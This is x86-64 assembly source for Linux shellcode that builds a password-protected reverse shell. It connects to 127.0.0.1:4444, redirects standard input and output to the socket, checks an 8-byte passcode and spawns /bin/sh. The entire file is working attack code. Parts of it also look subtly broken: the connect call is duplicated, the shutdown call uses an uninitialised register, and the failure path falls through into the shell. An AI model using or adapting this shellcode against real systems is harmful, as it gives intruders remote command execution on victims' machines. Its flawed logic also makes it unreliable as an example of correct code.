global _start

section .text

_start:

	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall

	mov rdi, rax

	xor rax, rax

	push rax

	; Stack:
	;        +------------------+
	; rsp => |0x0000000000000000|
	;        +------------------+

	; ip:   python3 -c "import socket; print(socket.inet_aton('127.0.0.1').hex()[::-1])"
	; port: python3 -c "import struct; print(struct.pack('<I', 4444).hex()))"

	mov dword [rsp-4], 0x0100007f
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8

	; Stack:           4   6   8
	;        +------------------+
	; rsp => |0x0100007f5c110002|
	;        +------------------+
	;        |0x0000000000000000|
	;        +------------------+

	mov rax, 42
	mov rsi, rsp
	mov rdx, 16
	syscall

	mov rax, 42
	mov rsi, rsp
	mov rdx, 16
	syscall

	mov rax, 33
	mov rsi, 0
	syscall

	mov rax, 33
	mov rsi, 1
	syscall

	mov rax, 33
	mov rsi, 2
	syscall

	jmp short promp

promp:

	call passcode
	hello: db 'Passcode: '

passcode:

	; print
	pop rsi

	; mov rax, 1
	xor rax, rax
	add rax, 1
	mov rdi, rax
	mov rdx, rax

	; mov rdx, 10
	add rdx, 9
	syscall

	; read
	xor rax, rax
	mov rdi, rax
	sub rsp, 8
	mov rsi, rsp
	mov dl, 8
	syscall

	mov rax, 0x6b6b6b6b6b6b6b6b
	mov rdi, [rsi]
	xor rax, rdi
	xor rdi, rdi
	cmp rax, rdi

	je shell

	; print
	pop rbx
	xor rbx, rbx
	push rbx

	; mov rax, 1
	; mov rdi, 1
	; mov rdx, 16
	xor rax, rax
	add rax, 1
	mov rdi, rax

	mov rdx, rax
	add rdx, 15
	mov ebx, 0x293a2021
	push rbx
	mov rbx, 0x79725420646f6f47
	push rbx
	mov rsi, rsp
	syscall

	; shutdown
	; mov rax, 48
	xor rax, rax
	add rax, 48
	mov rdi, r9

	; mov rsi, 2
	xor rsi, rsi
	add rsi, 2
	syscall

shell:

	; +===== /bin/sh ======+

	xor rax, rax
	mov rbx, 0x68732f2f6e69622f

	push rax
	push rbx

	mov rdi, rsp

	push rax
	push rdi

	mov rsi, rsp
	xor rdx, rdx

	mov al, 59
	syscall
